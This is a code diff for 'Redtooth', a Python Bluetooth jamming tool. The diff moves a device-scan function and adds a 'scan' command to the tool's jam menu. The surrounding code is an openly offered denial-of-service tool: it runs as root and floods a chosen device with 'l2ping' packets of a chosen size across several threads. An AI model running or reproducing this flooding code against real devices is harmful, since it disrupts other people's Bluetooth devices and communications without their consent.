@@ -19,11 +19,12 @@ global threads_count
 global target
 print("\n")
 art.tprint("Redtooth", font="fraktur")
-print("=====================================")
+print("============================================")
 print("Author: Logan Goins\n")
 if not os.geteuid() == 0:
     sys.exit("\nRun as root\n")
 print("Type \"help\" for more information")
+print("making sure your bluetooth adapter is enabled...\n")
 try:
     nearby_devices = discover_devices()
 except OSError:
@@ -34,6 +35,34 @@ except OSError:
 def DOS(target, packetsize):
     subprocess.call(["l2ping", "-i", "hci0", "-s", str(packetsize), "-f", target], stdout=open(os.devnull, 'wb'))
     
+
+def scan():
+
+    
+    try:    
+        print("Scanning for devices...")
+
+        nearby_devices = discover_devices(lookup_names = True)
+        
+
+        print(" ")
+        print("                 Devices:\n")
+        print("============================================")
+        for name, addr in nearby_devices:
+            print (" > %s - %s" % (addr, name))
+            
+
+        print(" \n")
+        print("============================================")
+        print ("found %d devices" % len(nearby_devices))
+        print(" ")
+    except OSError as error:
+        print(error)
+        print("Make sure your bluetooth adapter is up and connected")
+        main()
+        
+
+
 
 def jam_module():
     while True:
@@ -59,6 +88,7 @@ def jam_module():
             print("set packetsize <packet size> ---  sets packet size for use (in bytes)")
             print("set threads <thread number>  ---  sets number of threads for attack")
             print("run or jam                   ---  starts attack")
+            print("scan                         ---  scans area for bluetooth devices")
             print("stop                         ---  stops all data flow")
             print("clear                        ---  clears terminal window")
             print("exit                         ---  returns to the parent module\n")
@@ -92,39 +122,16 @@ def jam_module():
         if cmd == "clear":
             os.system("clear")
 
+        if cmd == "scan":
+            scan()
+
         if cmd == "exit":
             main()
 
         if cmd == "stop":
             os.system("killall l2ping")
 
-
-
-def scan():
-
     
-    try:    
-        print("Scanning for devices...")
-
-        nearby_devices = discover_devices(lookup_names = True)
-        
-
-        print(" ")
-        print("        Devices:\n")
-        print("============================================")
-        for name, addr in nearby_devices:
-            print (" > %s - %s" % (addr, name))
-            
-
-        print(" \n")
-        print("============================================")
-        print ("found %d devices" % len(nearby_devices))
-        print(" ")
-    except OSError as error:
-        print(error)
-        print("Make sure your bluetooth adapter is up and connected")
-        main()
-        
 
 def jam(target, threads_count, packetsize):
    
